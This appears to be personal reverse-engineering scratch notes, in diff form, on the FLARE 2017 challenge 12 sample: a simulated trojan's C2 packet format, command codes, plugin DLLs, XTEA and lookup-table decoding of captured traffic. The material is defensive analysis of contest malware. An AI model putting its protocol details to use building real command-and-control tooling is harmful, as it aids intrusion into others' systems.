+006CDF40  1C 00 00 00 42 00 00 00  42 00 00 00              ....B...B...
+Loop 1:
+42 00 00 00
+42 is the counter, goes by size of expected data.
+
+a2 = (byte) 17 (of 17 04 17 20  0x20170417)
+v6 = ~1 (0xFFFFFFFF)
+dword_block[(v6 ^ 17++)] ^ (v6 >> 8)
+
+
+Dump out xor_key table, 408 bytes. XOR across whole remainder of packet:
+0052BBF0  17 04 17 20 0E 00 00 00  00 00 00 00 00 00 00 00  ... ............
+0052BC00  00 00 00 00 15 5B BF 4A  1E FE 15 17 73 46 04 B9  .....[¿J.þ..sF.¹
+0052BC10  D4 2B 80 E8 77 00 65 00  6C 00 63 00 6F 00 6D 00  Ô+€èw.e.l.c.o.m.
+0052BC20  65 00 70 00 61 00 73 00  73 00 31 00 21 00 31 00  e.p.a.s.s.1.!.1.
+0052BC30  00 00                                             ..
+
+save as packet_hash.py
+First packet result:
+0x4181f1af -- this is compared to the 2nd dword in packet -- hash verification
+00000000  32 30 31 37 AF F1 81 41 24 00 00 00 5E 00 00 00  2017¯ñ.A$...^...
+00000010  5E 00 00 00                                      ^...
+
+Once all done, does another 16-byte comparison near end. from 15 5B BF 4A ... D4 2B 80 E8. Like the two previous, this is hard coded in the binary.
+
+
+Packet len:130  (minus key: 126)
+0 - 4  : 2017
+4 - 8  : AF F1 81 41  (hash verification)
+8  - 12: 24 00 00 00  (36)
+12 - 16: 5E 00 00 00  (94)  (36+94 = 130)
+16 - 20: 5E 00 00 00  (94)
+20 - 24: 51 29 8F 74  (1955539281)
+24 - 28: 16 67 D7 ED  (3990316822)
+28 - 32: 29 41 95 01  (26558761)
+32 - 36: 06 F5 05 45  (1158018310) -- end of 36 if it back-dated its size
+36 - 40: 1C 00 00 00  (28) -- size of from here to BLZ!
+40 - 44: 42 00 00 00  (66 - size of payload)
+48 - 52: 42 00 00 00  (66 - size of payload)
+52 - 56: F3 71 26 AD
+56 - 60: 88 A5 61 7E
+60 - 64: AF 06 00 0D  (218105519)
+64 - 68: 42 4C 5A 21  BLZ!
+<<payload start>>
+68 - 72: 17 04 17 20  2017-04-17
+72 - 76: 0E 00 00 00  (Command)
+76 - 80: 00 00 00 00
+80 - 84: 00 00 00 00
+84 - 88: 00 00 00 00
+88 - 92: 15 5B BF 4A
+92 - 96: 1E FE 15 17
+96 -100: 73 46 04 B9
+100-104: D4 2B 80 E8
+104-END: welcomepass1!1
+
+struct header:
+{
+  dword key
+  dword hash
+  dword hdr_len
+  dword data_len
+  dword data_len2
+  dword unk1
+  dword unk2
+  dword unk3
+  dword unk4
+  dword size_table1
+  dword payload_size
+  dword payload_size2
+  dword tb1_unk5
+  dword tb1_unk6
+  dword tb1_unk7
+  dword tb1_BLZ!
+  dword tb1_date
+  dword size_key
+  dword tb2_blank1
+  dword tb2_blank2
+  dword tb2_blank3
+  dword tb2_unk8
+  dword tb2_unk9
+  dword tb2_unk10
+  dword tb2_unk11
+  char[size_key] key
+}
+
+
+For C2 to work: size of data (0x42) must be >= 0x24 (36)
+0x0E is your command. Finally.
+
+E, 4, 5, 6... 7 (load)
+
+0x02
+0x03 (Get Victim system information)
+0x04 (Send handshake hashes for CMD, COMP, CRPT)
+0x05 (??) - reqs 68-byte payload
+0x06 (receive file)
+0x07 (load file)
+0x08
+0x09 (unsupported)
+0x0A (unsupported)
+0x0B
+0x0C
+0X0E (C2 Ack / hello)  Responds ACK - confirmed in PCAP
+
+Let's get the whole sequence of what's used, then.
+
+0e 04 05 06 X 06 X 06 X 06 X 06 X 07 05 X 06 X 06 X 07 X 06 X 06 X 06 X 07 X 06 X 06 X 06 X 06 X 03 X 06 X 07 X 07 X 07 74 X 06 6a c7 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X 03 X
+
+E, 4, 5, 6, 7, 5, 6, 7, 6, 7, 6, 3, 6, 7, 74, 6, 6a, c7, 3, 3, 3, 3, 3, 3, 3, 3, 3...
+
+
+Map each plugin as its loaded:
+
+  v2 = (kernel32_GetModuleHandleW)(L"kernel32.dll", a1);
+  dword_134FA0 = (kernel32_GetProcAddress)(v2, "FlsAlloc") ^ 0x54A92471;
+  dword_134FA4 = (kernel32_GetProcAddress)(v2, "FlsFree") ^ 0x54A92471;
+  dword_134FA8 = (kernel32_GetProcAddress)(v2, "FlsGetValue") ^ 0x54A92471;
+  dword_134FAC = (kernel32_GetProcAddress)(v2, "FlsSetValue") ^ 0x54A92471;
+  dword_134FB0 = (kernel32_GetProcAddress)(v2, "InitializeCriticalSectionEx") ^ 0x54A92471;
+  dword_134FB4 = (kernel32_GetProcAddress)(v2, "CreateEventExW") ^ 0x54A92471;
+  dword_134FB8 = (kernel32_GetProcAddress)(v2, "CreateSemaphoreExW") ^ 0x54A92471;
+  dword_134FBC = (kernel32_GetProcAddress)(v2, "SetThreadStackGuarantee") ^ 0x54A92471;
+  dword_134FC0 = (kernel32_GetProcAddress)(v2, "CreateThreadpoolTimer") ^ 0x54A92471;
+  dword_134FC4 = (kernel32_GetProcAddress)(v2, "SetThreadpoolTimer") ^ 0x54A92471;
+  dword_134FC8 = (kernel32_GetProcAddress)(v2, "WaitForThreadpoolTimerCallbacks") ^ 0x54A92471;
+  dword_134FCC = (kernel32_GetProcAddress)(v2, "CloseThreadpoolTimer") ^ 0x54A92471;
+  dword_134FD0 = (kernel32_GetProcAddress)(v2, "CreateThreadpoolWait") ^ 0x54A92471;
+  dword_134FD4 = (kernel32_GetProcAddress)(v2, "SetThreadpoolWait") ^ 0x54A92471;
+  dword_134FD8 = (kernel32_GetProcAddress)(v2, "CloseThreadpoolWait") ^ 0x54A92471;
+  dword_134FDC = (kernel32_GetProcAddress)(v2, "FlushProcessWriteBuffers") ^ 0x54A92471;
+  dword_134FE0 = (kernel32_GetProcAddress)(v2, "FreeLibraryWhenCallbackReturns") ^ 0x54A92471;
+  dword_134FE4 = (kernel32_GetProcAddress)(v2, "GetCurrentProcessorNumber") ^ 0x54A92471;
+  dword_134FE8 = (kernel32_GetProcAddress)(v2, "GetLogicalProcessorInformation") ^ 0x54A92471;
+  dword_134FEC = (kernel32_GetProcAddress)(v2, "CreateSymbolicLinkW") ^ 0x54A92471;
+  dword_134FF0 = (kernel32_GetProcAddress)(v2, "SetDefaultDllDirectories") ^ 0x54A92471;
+  dword_134FF8 = (kernel32_GetProcAddress)(v2, "EnumSystemLocalesEx") ^ 0x54A92471;
+  dword_134FF4 = (kernel32_GetProcAddress)(v2, "CompareStringEx") ^ 0x54A92471;
+  dword_134FFC = (kernel32_GetProcAddress)(v2, "GetDateFormatEx") ^ 0x54A92471;
+  dword_135000 = (kernel32_GetProcAddress)(v2, "GetLocaleInfoEx") ^ 0x54A92471;
+  dword_135004 = (kernel32_GetProcAddress)(v2, "GetTimeFormatEx") ^ 0x54A92471;
+  dword_135008 = (kernel32_GetProcAddress)(v2, "GetUserDefaultLocaleName") ^ 0x54A92471;
+  dword_13500C = (kernel32_GetProcAddress)(v2, "IsValidLocaleName") ^ 0x54A92471;
+  dword_135010 = (kernel32_GetProcAddress)(v2, "LCMapStringEx") ^ 0x54A92471;
+  dword_135014 = (kernel32_GetProcAddress)(v2, "GetCurrentPackageId") ^ 0x54A92471;
+  dword_135018 = (kernel32_GetProcAddress)(v2, "GetTickCount64") ^ 0x54A92471;
+  dword_13501C = (kernel32_GetProcAddress)(v2, "GetFileInformationByHandleExW") ^ 0x54A92471;
+
+This is standard in all of them
+
+Find the diff point.
+After GetCommandLineA?
+All do that, and get Env Strings
+
+
+int __cdecl sub_1233A7(int (**a1)(void), unsigned int a2)
+{
+  int (**v2)(void); // esi
+  int result; // eax
+
+  v2 = a1;
+  result = 0;
+  while ( v2 < a2 && !result )
+  {
+    if ( *v2 )
+      result = (*v2)();
+    ++v2;
+  }
+  return result;
+}
+
+Here it loops through a series of sub(). Each dramatically different.
+
+Stop, redo. Focus on DLLs. Load statically, compare functions.
+Same big ones.
+
+Meta and order of execution:
+DLL1: 1.0.4 r.dll
+DLL2: 1.1.8 t.dll
+DLL3: 1.0.4 6.dll
+DLL4: 1.0.1 x.dll
+DLL5: 1.0.1 z.dll
+DLL6: 2.1.2 f.dll
+DLL7: 1.1.0 s.dll
+DLL8: 1.3.0 m.dll
+
+ssdeep
+1536:Ijusu06/i09NU8mF/2gZTXSlHI2scFt/s8jcd14VIb:IWi0gFFegdGw14VIb,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll1.dat"
+1536:G/rsu0ggtJpJpmGOEw/UTkSTpKU9oH93lGcU6/ps8jcduvjVRa0:bXXpmGn4O0RUuvjV5,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll1b.dat"
+1536:2/m5Asu0wHYdPU8MDu2j/Ur8vABAMdIlMct0nSs8jcdmXjVR+:t5b6Yp6uo28vkl3mXjVA,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll2.dat"
+1536:jJBVsu0lPCK2TMzsLW/CheYcVxdcnjs8jcdqxVH:+ZCpTMzsLKyV2qxVH,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll3.dat"
+1536:c/insu0PBqP67PA/gRikexp4TTcgJsWjcdsVTGq:sgPQmgRim2sVj,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll4.dat"
+3072:sgPQmgRim2sV6rX9l/qwIqCizyVGhNyWTBfYAcsVW:75DvXtSWTBgX,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll5.dat"
+1536:jzsHKAt7X463IHupQMb37WwFHvQiE6su0MUdtUTFK4mGU/EHGw0lcQgrNDsWjcdI:GVo63IZULPpe/4mGa5ghsfJ/V8,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll6.dat"
+1536:dT3su0HANlKHiBKlZHWnwSiLvcsWSxs8jcdSSVEW:Fwg3KHAKrWZtSSVEW,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll7.dat"
+1536:Psu0NcOBdveaW2Paov5WlTxu9TnfcI32Ys8jcdSwJVL:oBLeaW2SoYg/cSwJVL,"/Users/bbaskin/CTF/FLARE_2017/12/plugins/dll8.dat"
+
+
+DLL6: Building a packet. Does some SHAx hashing.
+  *a2 = *(a1 + 8) >> 24;
+  a2[1] = *(a1 + 8) >> 16;
+  a2[2] = *(a1 + 8) >> 8;
+  a2[3] = *(a1 + 8);
+  a2[4] = *(a1 + 12) >> 24;
+  a2[5] = *(a1 + 12) >> 16;
+  a2[6] = *(a1 + 12) >> 8;
+  a2[7] = *(a1 + 12);
+  a2[8] = *(a1 + 16) >> 24;
+  a2[9] = *(a1 + 16) >> 16;
+  a2[10] = *(a1 + 16) >> 8;
+  a2[11] = *(a1 + 16);
+  a2[12] = *(a1 + 20) >> 24;
+  a2[13] = *(a1 + 20) >> 16;
+  a2[14] = *(a1 + 20) >> 8;
+  a2[15] = *(a1 + 20);
+  a2[16] = *(a1 + 24) >> 24;
+  a2[17] = *(a1 + 24) >> 16;
+  a2[18] = *(a1 + 24) >> 8;
+  result = 19;
+  a2[19] = *(a1 + 24);
+  return result;
+}
+
+DLL8 sub_10002978 is the claw for Twitter
+has:
+oid __cdecl sub_10008DDA(int *a1)
+{
+  if ( a1 )
+  {
+    sub_100044F7(a1[1]);
+    sub_100044F7(a1[2]);
+    sub_100044F7(a1[3]);
+    sub_100044F7(a1[4]);
+    sub_100044F7(a1[5]);
+    sub_100044F7(a1[6]);
+    sub_100044F7(*a1);
+    sub_100044F7(a1[8]);
+    sub_100044F7(a1[9]);
+    sub_100044F7(a1[10]);
+    sub_100044F7(a1[11]);
+    sub_100044F7(a1[12]);
+    ...
+
+
+
+
+Ugh, jump back to packets. Maybe try to hit from that direction. Count out sessions from client that aren't ACK's to some command (so packets without a 17041720xx): found 39 sessions
+
+wrote 12_parse_victim.py to detect these and pull them all directly out to XX.dat files.
+Too much data, rewrite to strip 'overhead' data and retain just raw data.
+
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000  32 30 31 37 97 D9 D3 32 34 00 00 00 40 00 00 00  2017—ÙÓ24...@...
+00000010  40 00 00 00 C3 0B 1A 2D CB 48 9C A8 A7 24 37 64  @...Ã..-ËHœ¨§$7d
+00000020  69 CF 67 82 A4 DC 10 B3 A2 62 60 09 F1 31 0B AF  iÏg‚¤Ü.³¢b`.ñ1.¯
+00000030  F0 5D E4 7C 0E AE 22 FC C2 50 B3 E9 C4 97 44 A8  ð]ä|.®"üÂP³éÄ—D¨
+00000040  A0 4A D3 82 89 EA 4D 7C 39 15 2C 3C 28 80 C3 00   JÓ‚‰êM|9.,<(€Ã.
+00000050  47 E4 08 B1 1C 8F 51 E1 32 2E 51 67 62 F4 11 81  Gä.±..Qá2.Qgbô..
+00000060  6E 0B 19 D7 28 BB 0A F3 7A C4 45 A0 8B BA 57 1F  n..×(».ózÄE ‹ºW.
+00000070  55 64 E5 A3                                      Udå£
+
+Some of these are bad; they're just continuing sessions, like psexec being xferred. Should start from beginning, session 0 ...
+
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000  00 00 C7 45 F8 00 00 00 00 8A 55 F8 88 55 FF EB  ..ÇEø....ŠUøˆUÿë
+00000010  09 8B 45 F8 83 C0 01 89 45 F8 81 7D F8 00 01 00  .‹EøƒÀ.‰Eø.}ø...
+00000020  00 7D 3B 8B 4D 08 03 4D F8 0F B6 09 8B 45 F8 99  .};‹M..Mø.¶.‹Eø™
+00000030  F7 7D 10 8B 45 0C 0F B6 14 10 03 CA 0F B6 45 FF  ÷}.‹E..¶...Ê.¶Eÿ
+00000040  03 C1 88 45 FF 0F B6 4D FF 03 4D 08 51 8B 55 08  .ÁˆEÿ.¶Mÿ.M.Q‹U.
+00000050  03 55 F8 52 E8 17 00 00 00 83 C4 08 EB B3 8B E5  .UøRè....ƒÄ.ë³‹å
+00000060  5D C3 CC CC CC CC CC CC CC CC CC CC CC CC CC CC  ]ÃÌÌÌÌÌÌÌÌÌÌÌÌÌÌ
+00000070  55 8B EC 51 8B 45 08 8A 08 88 4D FF 8B 55 08 8B  U‹ìQ‹E.Š.ˆMÿ‹U.‹
+
+
+55 8B looks like code, so does 55 F8. Woot! No. Analysis shows the same functions that were in the plugins.
+
+ok, don't break on packet flow. Dump all victim data into a file and split on '2017' header
+
+00000000   32 30 31 37 C8 92 54 E8  34 00 00 00 60 40 00 00   2017È’Tè4   `@
+00000010   60 40 00 00 C3 0B 1A 2D  CB 48 9C A8 A7 24 37 64   `@  Ã  -ËHœ¨§$7d
+00000020   69 CF 67 82 B8 18 42 EF  DD 68 7B 66 1A 43 12 1E   iÏg‚¸ BïÝh{f C
+
+00000000   32 30 31 37 F8 93 50 5A  34 00 00 00 60 40 00 00   2017ø“PZ4   `@
+00000010   60 40 00 00 C3 0B 1A 2D  CB 48 9C A8 A7 24 37 64   `@  Ã  -ËHœ¨§$7d
+00000020   69 CF 67 82 04 71 4D 3D  47 B3 75 52 F1 C8 AC 0D   iÏg‚ qM=G³uRñÈ¬
+
+00000000   32 30 31 37 B2 04 FD 2B  24 00 00 00 60 40 00 00   2017² ý+$   `@
+00000010   60 40 00 00 38 BE 0F 62  4C E2 74 FC 61 F7 5C 90   `@  8¾ bLâtüa÷\
+00000020   CB 3F 59 15 4A 71 71 71  FA 30 71 71 FA 30 71 71   Ë?Y Jqqqú0qqú0qq
+
+00000000   32 30 31 37 A3 95 98 56  24 00 00 00 D8 55 00 00   2017£•˜V$   ØU
+00000010   60 40 00 00 BA 05 04 FC  C0 8F 91 21 D1 6F D3 FE   `@  º  üÀ ‘!ÑoÓþ
+00000020   D1 71 0E 60 58 42 42 42  42 4F 63 42 42 42 37 4F   Ñq `XBBBBOcBBB7O
+
+00000000   32 30 31 37 4E 82 DC 6D  3C 00 00 00 60 40 00 00   2017N‚Üm<   `@
+00000010   60 40 00 00 B2 E5 49 0D  26 54 05 9B BB AB 7F 2A   `@  ²åI &T ›»« *
+00000020   67 FE 5F F4 16 98 C6 FE  72 C2 FF 06 90 C2 AF 63   gþ_ô ˜ÆþrÂÿ  Â¯c
+
+struct
+  char[4] magic
+  dword hash
+  dword unk  -- 24 = 36, 34 = 52, 3C = 60
+  dword datasize  -- 0x4060 = 16480, 0x55D8 = 21976 -- block size?
+  dword datasize2 -- 0x4060 = 16480 -- all are the same
+
+Back to debugging. Calls DLL plugin.
+Immediately upon leaving the plugin, it sends packets.
+Send:
+Command: 7
+Payload: ├♂→-╦H£¿º$7di╧géCRPT
+(c30b1a2dcb489ca8a724376469cf678243525054)
+
+In each plugin, it hits some block of data after the "version"? Starting at 50 12 0F 00 (987728?)
+
+
+000FD130  00 00 00 00 31 2E 30 2E  34 00 00 00 50 12 0F 00  ....1.0.4...P...
+000FD140  31 16 0F 00 31 16 0F 00  31 16 0F 00 31 16 0F 00  1...1...1...1...
+000FD150  31 16 0F 00 31 16 0F 00  31 16 0F 00 80 12 0F 00  1...1...1...€...
+000FD160  40 15 0F 00 50 15 0F 00  60 15 0F 00 90 15 0F 00  @...P...`.......
+
+This plugin returns "FD15C" (1036636?)
+
+Grabs block:
+00102000  C3 0B 1A 2D CB 48 9C A8  A7 24 37 64 69 CF 67 82  Ã..-ËHœ¨§$7diÏg‚
+00102010  17 84 F3 3B E8 7B 0C C4  02 00 00 00 00 00 00 00  .„ó;è{.Ä........
+
+
+
+
+Shit, just realized my DLL5 is actually two executables. I grabbed too many. Split out. But the new dll5 doesn't have an ID :/
+
+Ran signsrch
+
+- open file "101.dll"
+  offset   num  description [bits.endian.size]
+  --------------------------------------------
+  10001e2c 2249 TEA1_DS [32.le.4]
+  100161da 2545 anti-debug: IsDebuggerPresent [..17]
+
+
+- open file "dll5.dll"
+  offset   num  description [bits.endian.size]
+  --------------------------------------------
+  0001ab00 641  CRC-32-IEEE 802.3 [crc32.0x04c11db7 le rev int_min.1024]
+  0001cb28 1087 Zlib length_code [..256]
+
+- open file "212.dll"
+  offset   num  description [bits.endian.size]
+  --------------------------------------------
+  00004406 1036 SHA1 / SHA0 / RIPEMD-160 initialization [32.le.20&]
+  0000443e 2053 RIPEMD-128 InitState [32.le.16&]
+
+
+Look for Base64? No, at least not anything any resemblance of base64 charset
+
+
+OK, back to PCAP. Look at victim sessions in reverse. Figure big file xfers up front to get exe's in place, then exfil at end?
+
+Last plugin maybe responsible for all that BBBBB Base64? That's 1.3.0.dll
+Every plugin has overlapping code, but a different DWORD "signature":
+
+.text:1000C786                 push    ebp
+.text:1000C787                 mov     ebp, esp
+.text:1000C789                 mov     eax, 1AF0h
+.text:1000C78E                 call    __alloca_probe
+.text:1000C793                 mov     eax, ds:3D7040h
+
+.text:100093CF                 push    ebp
+.text:100093D0                 mov     ebp, esp
+.text:100093D2                 mov     eax, 1AF0h
+.text:100093D7                 call    __alloca_probe
+.text:100093DC                 mov     eax, ds:463010h
+
+
+Run auto_find_encryption (had to rewrite some to account for loc_ instead of sub_)
+
+101.dll has:
+loc_1000484F: xor ecx, 49656E69h
+loc_1000484F: xor eax, 6C65746Eh
+loc_1000484F: xor eax, 756E6547h
+==
+    v7 = (_EBX ^ 'uneG' | _ECX ^ 'letn' | _EDX ^ 'Ieni') != 0;
+    __asm { cpuid }
+    v23 = _EAX;
+    v25 = _ECX;
+    if ( v7
+      || (v12 = _EAX & 0xFFF3FF0, (v23 & 0xFFF3FF0) != 67264)
+      && v12 != 0x20660
+      && v12 != 0x20670
+      && v12 != 0x30650
+      && v12 != 0x30660
+      && v12 != 0x30670 )
+    {
+
+  if ( a2 == 1 )
+  {
+    v7 = 0;
+    for ( i = 0; i < 32; ++i )
+    {
+      v11 += (*(a1 + 4 * (v7 & 3)) + v7) ^ (v10 + ((v10 >> 5) ^ 16 * v10));
+      v7 -= 0x61C88647;
+      v10 += (*(a1 + 4 * ((v7 >> 11) & 3)) + v7) ^ (v11 + ((v11 >> 5) ^ 16 * v11));
+    }
+  }
+  else
+  {
+    v6 = 0xC6EF3720;
+    for ( j = 0; j < 32; ++j )
+    {
+      v10 -= (*(a1 + 4 * ((v6 >> 11) & 3)) + v6) ^ (v11 + ((v11 >> 5) ^ 16 * v11));
+      v6 += 0x61C88647;
+      v11 -= (*(a1 + 4 * (v6 & 3)) + v6) ^ (v10 + ((v10 >> 5) ^ 16 * v10));
+    }
+  }
+
+  That's XTEA -- 101.dll has XTEA encryption.
+
+10017C00  20 20 58 54 45 41 20 74  65 73 74 20 23 25 64 3A    XTEA test #%d:
+10017C10  20 00 00 00 66 61 69 6C  65 64 0A 00 70 61 73 73   ...failed..pass
+10017C20  65 64 0A 00 0A 00 00 00  B2 E5 49 0D 26 54 05 9B  ed......²åI.&T.›
+10017C30  BB AB 7F 2A 67 FE 5F F4  00 00 00 00 00 00 00 00  »«.*gþ_ô........
+
+ok, focus on order of operations of unusual packets:
+1.0.4 r.dll
+
+0000097C  32 30 31 37 6e 14 78 ff  24 00 00 00 40 00 00 00   2017n.x. $...@...
+0000098C  40 00 00 00 38 be 0f 62  4c e2 74 fc 61 f7 5c 90   @...8..b L.t.a.\.
+0000099C  cb 3f 59 15 4a 71 71 71  98 71 71 71 98 71 71 71   .?Y.Jqqq .qqq.qqq
+000009AC  b4 5f 57 06 db fc cd 2c  d7 2d 71 39 5a 13 59 1e   ._W...., .-q9Z.Y.
+000009BC  40 28 40 3e 61 71 71 71  05 71 71 71 71 71 71 71   @(@>aqqq .qqqqqqq
+000009CC  71 71 71 71 7d 96 b7 47  37 6c 7d 40 33 f6 28 99   qqqq}..G 7l}@3.(.
+000009DC  08 16 b9 d4                                        ....
+    000262E2  32 30 31 37 94 22 e2 a6  24 00 00 00 60 40 00 00   2017.".. $...`@..
+    000262F2  60 40 00 00 38 be 0f 62  4c e2 74 fc 61 f7 5c 90   `@..8..b L.t.a.\.
+    00026302  cb 3f 59 15 4a 71 71 71  fa 30 71 71 fa 30 71 71   .?Y.Jqqq .0qq.0qq
+    00026312  b4 5f 57 06 db fc cd 2c  d7 2d 71 39 5a 13 59 1e   ._W...., .-q9Z.Y.
+    00026322  40 28 40 3e 2d 71 71 71  9e 71 71 71 71 71 71 71   @(@>-qqq .qqqqqqq
+    00026332  71 71 71 71 7d 96 b7 47  37 6c 7d 40 33 f6 28 99   qqqq}..G 7l}@3.(.
+    00026342  08 16 b9 d4 62 61 28 0b  ed fd 8c 1e 81 9d c3 6c   ....ba(. .......l
+    00026352  81 5f 3f 42 8b 0a d8 a6  71 71 71 71 71 0f 11 71   ._?B.... qqqqq..q
+    00026362  71 30 71 71 13 d1 71 71  71 71 71 71 71 71 71 71   q0qq..qq qqqqqqqq
+
+Break structure out, look for 38 be 0f 62  4c e2 74 fc 61 f7 5c 90 cb 3f 59 15. That seems to be common in a few challenge/responses. ANd only for that 'qqqq' packets
+
+104.dll has it, first one to be loaded. Nice
+10012000  38 BE 0F 62 4C E2 74 FC  61 F7 5C 90 CB 3F 59 15  8¾.bLâtüa÷\.Ë?Y.
+10012010  C7 19 30 0C A8 10 AD D5  D4 16 52 FC 1B 82 7D 32  Ç.0.¨.­ÕÔ.Rü.‚}2
+10012020  34 01 E6 4C 12 08 2B F7  AC 8B 3F 67 48 72 21 DC  4.æL..+÷¬‹?gHr!Ü
+10012030  ED F6 85 B8 4F 5F 53 0A  04 28 DF D8 7E 06 3D 03  íö…¸O_S..(ßØ~.=.
+
+It's being used in a bunch of 16-byte memcmps, just like packet checks in RAT. That block after it looks interesting too. Used in a 256-byte check:
+  for ( i = 0; i < 256; ++i )
+  {
+    if ( byte_10012010[i] == a1 )
+      return i;
+  }
+  return -1;
+
+Does a lookup for whatever submitted byte and returns index in that array.
+  (*(v6[2] + 200))(v7 + 5, packet_type, 16);    // memcmp
+  for ( i = 0; i < a3; ++i )
+    *(v7 + i + 36) = LookupByteArray(*(i + a2));
+
+It's building a packet and putting that into the response?
+
+    000262E2  32 30 31 37 94 22 e2 a6  24 00 00 00 60 40 00 00   2017.".. $...`@..
+    000262F2  60 40 00 00 38 be 0f 62  4c e2 74 fc 61 f7 5c 90   `@..8..b L.t.a.\.
+    00026302  cb 3f 59 15 4a 71 71 71  fa 30 71 71 fa 30 71 71   .?Y.Jqqq .0qq.0qq
+    00026312  b4 5f 57 06 db fc cd 2c  d7 2d 71 39 5a 13 59 1e   ._W...., .-q9Z.Y.
+    00026322  40 28 40 3e 2d 71 71 71  9e 71 71 71 71 71 71 71   @(@>-qqq .qqqqqqq
+    00026332  71 71 71 71 7d 96 b7 47  37 6c 7d 40 33 f6 28 99   qqqq}..G 7l}@3.(.
+    00026342  08 16 b9 d4 62 61 28 0b  ed fd 8c 1e 81 9d c3 6c   ....ba(. .......l
+    00026352  81 5f 3f 42 8b 0a d8 a6  71 71 71 71 71 0f 11 71   ._?B.... qqqqq..q
+    00026362  71 30 71 71 13 d1 71 71  71 71 71 71 71 71 71 71   q0qq..qq qqqqqqqq
+
+4a 71 71 71 fa 30 71 71 fa 30 71 71
+a=[0x4a,0x71,0x71,0x71,0xfa,0x30,0x71,0x71,0xfa,0x30,0x71,0x71,0xb4,0x5f,0x57,0x06,0xdb,0xfc,0xcd,0x2c,0xd7,0x2d,0x71,0x39,0x5a,0x13,0x59,0x1e,0x40,0x28,0x40,0x3e,0x2d,0x71,0x71,0x71,0x9e,0x71,0x71,0x71,0x71,0x71,0x71,0x71,0x71,0x71,0x71,0x71,0x7d,0x96,0xb7,0x47,0x37,0x6c,0x7d,0x40,0x33,0xf6,0x28,0x99]
+lookup=[0xc7,0x19,0x30,0x0c,0xa8,0x10,0xad,0xd5,0xd4,0x16,0x52,0xfc,0x1b,0x82,0x7d,0x32,0x34,0x01,0xe6,0x4c,0x12,0x08,0x2b,0xf7,0xac,0x8b,0x3f,0x67,0x48,0x72,0x21,0xdc,0xed,0xf6,0x85,0xb8,0x4f,0x5f,0x53,0x0a,0x04,0x28,0xdf,0xd8,0x7e,0x06,0x3d,0x03,0x40,0x36,0x68,0x73,0x25,0xb7,0x5d,0x1e,0xd2,0x0d,0xc6,0xc3,0x22,0xf2,0x20,0x0e,0x17,0xcc,0x60,0x5c,0x51,0xc2,0x1d,0x4a,0xcb,0x33,0x1c,0xf8,0x66,0x83,0x6b,0x3e,0x27,0xe3,0x9f,0xf5,0x3a,0xaa,0x8a,0x26,0x7f,0x5a,0x42,0xcf,0x7c,0x07,0x58,0x71,0xeb,0x05,0xba,0x29,0x4b,0x7a,0xe0,0xec,0x9a,0x7b,0x2e,0x37,0xfe,0xa4,0xbe,0x49,0xde,0x00,0xc5,0xbb,0x96,0xe9,0xc4,0x79,0x99,0x87,0xf4,0x13,0x1a,0x15,0x63,0xf9,0xa0,0xd1,0x02,0xd6,0x09,0x1f,0xe5,0x92,0x6a,0xe7,0x18,0x43,0x91,0x6e,0x41,0xc8,0xa3,0xb2,0x2c,0xee,0x8d,0xa6,0x5b,0xef,0x24,0xb9,0x75,0x57,0x0f,0x6f,0x11,0x47,0x9b,0x3b,0x76,0xe1,0x9d,0x64,0x54,0xa7,0xc1,0x55,0xb3,0x89,0x31,0xfd,0xab,0xb1,0x94,0xb6,0x14,0x2f,0xf3,0xbc,0x69,0xbf,0xa1,0x80,0x59,0x0b,0xbd,0xc9,0x2a,0xd7,0x81,0x3c,0x23,0xd3,0xf1,0xfa,0xea,0x39,0x38,0x9e,0x5e,0xb5,0x45,0x61,0xff,0x4e,0x77,0x4d,0x65,0x9c,0xe8,0xd9,0x93,0xaf,0x50,0xa2,0x84,0x88,0x78,0x98,0xe2,0x86,0xce,0xdd,0x8c,0x8e,0xa9,0x95,0x70,0xae,0xe4,0xca,0x62,0xcd,0x90,0xc0,0xfb,0xb0,0xdb,0xb4,0xd0,0x97,0xf0,0x2d,0x46,0xda,0x6c,0x6d,0x44,0x74,0xa5,0x8f,0x56,0x35]
+
+= [28, 0, 0, 0, 68, 64, 0, 0, 68, 64, 0, 0, 243, 113, 38, 173, 136, 165, 97, 126, 175, 6, 0, 13, 66, 76, 90, 33, 23, 4, 23, 32, 6, 0, 0, 0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 21, 91, 191, 74, 30, 254, 21, 23, 115, 70, 4, 185]
+00000000: 1C 00 00 00 44 40 00 00  44 40 00 00 F3 71 26 AD  ....D@..D@...q&.
+00000010: 88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ..a~....BLZ!...
+00000020: 06 00 00 00 11 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 15 5B BF 4A 1E FE 15 17  73 46 04 B9              .[.J....sF..
+
+wtf, BLZ. OMFG Yes! It's actually taking the regular packets and encrypting this way. So, qqqq = this type of lookup, since I don't see it in other DLLs. Specific to 104.dll?
+
+So everything after 'cb 3f 59 15' is data to be decrypted. Writing parser:
+
+00000000: 4A 71 71 71 98 71 71 71  98 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 61 71 71 71 05 71 71 71  71 71 71 71 71 71 71 71  aqqq.qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
+00000000: 4A 71 71 71 FA 71 71 71  FA 71 71 71 B4 5F 57 06  Jqqq.qqq.qqq._W.
+00000010: DB FC CD 2C D7 2D 71 39  5A 13 59 1E 40 28 40 3E  ...,.-q9Z.Y.@(@>
+00000020: 2D 71 71 71 7B 71 71 71  71 71 71 71 71 71 71 71  -qqq{qqqqqqqqqqq
+00000030: 7D 96 B7 47 37 6C 7D 40  33 F6 28 99 08 16 B9 D4  }..G7l}@3.(.....
